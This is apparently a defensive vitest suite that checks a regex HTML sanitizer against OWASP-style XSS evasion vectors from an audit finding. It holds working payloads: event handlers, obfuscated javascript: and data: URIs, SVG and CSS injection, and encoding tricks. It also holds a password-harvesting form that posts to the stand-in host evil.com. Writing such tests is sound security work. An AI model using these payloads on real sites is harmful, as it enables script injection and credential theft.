/**
 * ADVERSARIAL TEST: XSS Sanitizer Bypass
 *
 * Audit finding: reports.ts sanitizeHtml() uses regex that fails to catch
 * event handlers inside attribute values. This is Mythos Chain 3.
 *
 * Source: OWASP XSS Filter Evasion Cheat Sheet
 * Target: server/routes/reports.ts → sanitizeHtml()
 */

import { describe, it, expect } from 'vitest';

// Extract sanitizeHtml for direct testing
// We replicate the exact function from reports.ts line 46-55
function sanitizeHtml(html: string): string {
  return html
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/<iframe[\s\S]*?<\/iframe>/gi, '')
    .replace(/<object[\s\S]*?<\/object>/gi, '')
    .replace(/<embed[\s\S]*?>/gi, '')
    .replace(/<link[\s\S]*?>/gi, '')
    .replace(/\bon\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '')
    .replace(/javascript\s*:/gi, 'blocked:');
}

describe('XSS Sanitizer — OWASP Evasion Vectors', () => {

  // ─── BASIC SCRIPT INJECTION ───
  describe('Script tag removal', () => {
    it('strips basic <script> tags', () => {
      const input = '<p>Hello</p><script>alert("xss")</script><p>World</p>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
    });

    it('strips script with attributes', () => {
      const input = '<script type="text/javascript" src="evil.js"></script>';
      expect(sanitizeHtml(input)).not.toContain('<script');
    });

    it('strips multiline script tags', () => {
      const input = `<script>
        var x = 1;
        alert(x);
      </script>`;
      expect(sanitizeHtml(input)).not.toContain('alert');
    });
  });

  // ─── EVENT HANDLER INJECTION (AUDIT FINDING: THESE SHOULD FAIL) ───
  describe('Event handler injection [KNOWN VULNERABILITY]', () => {
    it('MUST strip onerror on img tag', () => {
      const input = '<img src=x onerror="alert(\'xss\')">';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('MUST strip onload on body tag', () => {
      const input = '<body onload="alert(\'xss\')">';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onload');
    });

    it('MUST strip onmouseover', () => {
      const input = '<div onmouseover="alert(\'xss\')">hover me</div>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onmouseover');
    });

    it('MUST strip onfocus with autofocus', () => {
      const input = '<input onfocus="alert(\'xss\')" autofocus>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onfocus');
    });

    it('MUST strip event handler with no quotes', () => {
      const input = '<img src=x onerror=alert(1)>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onerror');
    });

    it('MUST strip event handler with backtick quotes', () => {
      const input = '<img src=x onerror=`alert(1)`>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onerror');
    });
  });

  // ─── JAVASCRIPT: URI INJECTION ───
  describe('javascript: URI injection', () => {
    it('blocks javascript: in href', () => {
      const input = '<a href="javascript:alert(1)">click</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('javascript:');
    });

    it('blocks JavaScript: with mixed case', () => {
      const input = '<a href="JaVaScRiPt:alert(1)">click</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toMatch(/javascript\s*:/i);
    });

    it('blocks javascript: with tab characters', () => {
      const input = '<a href="java\tscript:alert(1)">click</a>';
      const result = sanitizeHtml(input);
      // This vector uses a tab to break the regex match
      expect(result).not.toContain('alert');
    });

    it('blocks javascript: with newline injection', () => {
      const input = '<a href="java\nscript:alert(1)">click</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('alert');
    });

    it('blocks javascript: with HTML entity encoding', () => {
      const input = '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>';
      const result = sanitizeHtml(input);
      // HTML entity encoded javascript: — regex won't catch this
      expect(result).not.toContain('&#106;');
    });
  });

  // ─── DATA URI INJECTION ───
  describe('data: URI injection', () => {
    it('MUST block data:text/html', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('data:text/html');
    });

    it('MUST block data: in img src', () => {
      const input = '<img src="data:image/svg+xml,<svg onload=alert(1)>">';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onload');
    });
  });

  // ─── SVG-BASED INJECTION ───
  describe('SVG injection', () => {
    it('MUST strip SVG with onload', () => {
      const input = '<svg onload="alert(1)">';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onload');
    });

    it('MUST strip SVG with embedded script', () => {
      const input = '<svg><script>alert(1)</script></svg>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('<script');
    });
  });

  // ─── FORM-BASED INJECTION ───
  describe('Form injection', () => {
    it('MUST block <form> tags (credential harvesting)', () => {
      const input = '<form action="https://evil.com/steal"><input name="password"></form>';
      const result = sanitizeHtml(input);
      // sanitizeHtml does NOT strip form tags — this is a gap
      expect(result).not.toContain('<form');
    });
  });

  // ─── CSS-BASED INJECTION ───
  describe('CSS injection', () => {
    it('MUST block style with expression()', () => {
      const input = '<div style="background:expression(alert(1))">text</div>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('expression');
    });

    it('MUST block style with url(javascript:)', () => {
      const input = '<div style="background:url(javascript:alert(1))">text</div>';
      const result = sanitizeHtml(input);
      expect(result).not.toMatch(/javascript\s*:/i);
    });
  });

  // ─── ENCODING EVASION ───
  describe('Encoding evasion', () => {
    it('MUST block UTF-7 encoded XSS', () => {
      const input = '+ADw-script+AD4-alert(1)+ADw-/script+AD4-';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('alert');
    });

    it('MUST block null byte injection', () => {
      const input = '<scr\x00ipt>alert(1)</scr\x00ipt>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('alert');
    });

    it('MUST block double encoding', () => {
      const input = '%253Cscript%253Ealert(1)%253C%252Fscript%253E';
      const result = sanitizeHtml(input);
      // Double-encoded — regex doesn't decode
      expect(result).not.toContain('script');
    });
  });
});
